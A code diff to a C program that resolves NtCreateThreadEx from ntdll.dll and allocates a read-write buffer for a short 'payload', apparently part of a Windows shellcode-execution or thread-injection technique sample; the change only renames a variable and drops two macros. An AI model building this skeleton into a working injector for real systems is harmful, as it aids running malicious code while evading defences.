@@ -18,8 +18,6 @@ Technique:
 #include <stdint.h>
 
 /* ========= some definition ========= */
-#define STATUS_SUCCESS       ((NTSTATUS)0x00000000L)
-#define NT_SUCCESS(Status)   ((NTSTATUS)(Status) == STATUS_SUCCESS)
 
 /* ========= function signatures ========= */
 typedef NTSTATUS NTAPI NtCreateThreadEx_t (
@@ -50,14 +48,14 @@ int main ()
     uint32_t    payload_len = 4;
 
     NTSTATUS    status;
-    HMODULE     ntdll;
+    HMODULE     lib;
 
     // function pointer to internal API
     pNtCreateThreadEx NtCreateThreadEx;
 
     // resolve all functions
-    ntdll = GetModuleHandle("ntdll.dll");
-    NtCreateThreadEx  = (pNtCreateThreadEx) GetProcAddress(ntdll, "NtCreateThreadEx");
+    lib = GetModuleHandle("ntdll.dll");
+    NtCreateThreadEx  = (pNtCreateThreadEx) GetProcAddress(lib, "NtCreateThreadEx");
 
     // allocate memory buffer for payload as READ-WRITE (no executable)
     runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
